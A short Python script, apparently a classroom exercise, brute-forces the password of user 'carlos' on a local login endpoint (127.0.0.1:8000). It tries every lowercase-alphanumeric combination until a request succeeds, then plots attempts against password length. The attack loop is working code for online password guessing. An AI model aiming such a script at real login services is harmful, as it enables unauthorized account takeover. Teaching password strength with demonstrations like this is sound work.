import itertools
import time
import matplotlib.pyplot as plt
import requests
 
alfabeto= "0123456789abcdefghijklmnopqrstuvwxyz"
sesion = requests.Session()
 
def fuerza_bruta( alfa: str):
    intentos= 0
    inicio= time.time()
    longitud= 1  
    while True:
        for combinacion in itertools.product(alfa, repeat=longitud):
            intento= "".join(combinacion)  
            intentos+= 1
            print(f"Probando contraseñas: {intento}")
            respuesta =sesion.post(
                "http://127.0.0.1:8000/login",json={"id":0,"username":"carlos","password":intento}
            )

            if respuesta.status_code == 200:
                fin= time.time()
                return intento, intentos, fin - inicio
        longitud+= 1  

encontrada, total_intentos, tiempo_total = fuerza_bruta( alfabeto)
print(f"Contraseña encontrada: {encontrada}")
print(f"Total de intentos: {total_intentos:}")
print(f"Tiempo de ejecución: {tiempo_total:.2f} segundos")

"""Parte de la gráfica"""
longitudes = list(range(1, 6))
intentos_grafica = [sum(len(alfabeto) ** l for l in range(1, n + 1)) for n in longitudes]
colores = ["red" if l == len(encontrada) else "steelblue" for l in longitudes]

plt.plot(longitudes, intentos_grafica)
plt.scatter(longitudes, intentos_grafica, color=colores, zorder=5)
plt.xlabel("Longitud de la contraseña")
plt.ylabel("Número de intentos")
plt.title("Fuerza bruta: intentos vs longitud")
plt.savefig("grafica_fuerza_bruta.png")
plt.show()